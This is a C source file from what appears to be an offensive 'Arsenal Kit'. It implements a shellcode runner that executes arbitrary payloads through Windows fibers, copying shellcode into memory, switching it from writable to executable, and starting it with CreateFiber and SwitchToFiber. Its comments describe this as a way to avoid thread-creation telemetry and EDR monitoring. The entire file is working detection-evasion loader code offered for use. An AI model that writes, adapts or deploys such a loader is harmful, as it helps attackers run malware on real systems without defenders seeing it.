/*
 * Starburst Arsenal Kit - Fiber-Based Execution Bypass
 *
 * Converts the current thread to a fiber, creates a new fiber with
 * shellcode as its entry point, and switches to it.  No CreateThread
 * call is made, so thread-creation telemetry is avoided.
 *
 * OPSEC:
 *   - No thread creation events generated.
 *   - Fiber execution is less commonly monitored by EDR.
 *   - Memory transitions RW -> RX (no RWX).
 *
 * Build: compiled alongside a main_*.c wrapper (see main_exe.c).
 */

#include <windows.h>

/* --------------------------------------------------------------------
 * Public interface: execute_shellcode
 * ------------------------------------------------------------------ */
void execute_shellcode(unsigned char *shellcode, unsigned int shellcode_len)
{
    LPVOID exec_mem;
    LPVOID mainFiber;
    LPVOID scFiber;
    DWORD  oldProtect;

    if (!shellcode || shellcode_len == 0)
        return;

    /* Convert the current thread to a fiber so we can switch fibers */
    mainFiber = ConvertThreadToFiber(NULL);
    if (!mainFiber)
    {
        /* If the thread is already a fiber, GetFiberData returns non-NULL
         * and ConvertThreadToFiber fails with ERROR_ALREADY_FIBER.       */
        if (GetLastError() == ERROR_ALREADY_FIBER)
            mainFiber = GetCurrentFiber();
        else
            return;
    }

    /* Allocate RW memory for the shellcode */
    exec_mem = VirtualAlloc(NULL, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!exec_mem)
        return;

    /* Copy shellcode into the allocated region */
    memcpy(exec_mem, shellcode, shellcode_len);

    /* Transition to RX -- avoids RWX */
    if (!VirtualProtect(exec_mem, shellcode_len, PAGE_EXECUTE_READ, &oldProtect))
    {
        VirtualFree(exec_mem, 0, MEM_RELEASE);
        return;
    }

    /* Create a fiber whose start routine is the shellcode.
     * The cast matches LPFIBER_START_ROUTINE (void WINAPI (*)(LPVOID)).
     * Most shellcode ignores the parameter, which is fine.              */
    scFiber = CreateFiber(0, (LPFIBER_START_ROUTINE)exec_mem, NULL);
    if (!scFiber)
    {
        VirtualFree(exec_mem, 0, MEM_RELEASE);
        return;
    }

    /* Switch to the shellcode fiber -- execution begins */
    SwitchToFiber(scFiber);

    /* If the shellcode switches back to mainFiber (or returns via
     * SwitchToFiber(mainFiber)), execution resumes here.           */
    DeleteFiber(scFiber);
    VirtualFree(exec_mem, 0, MEM_RELEASE);

    /* Optionally convert back to a regular thread */
    ConvertFiberToThread();
}
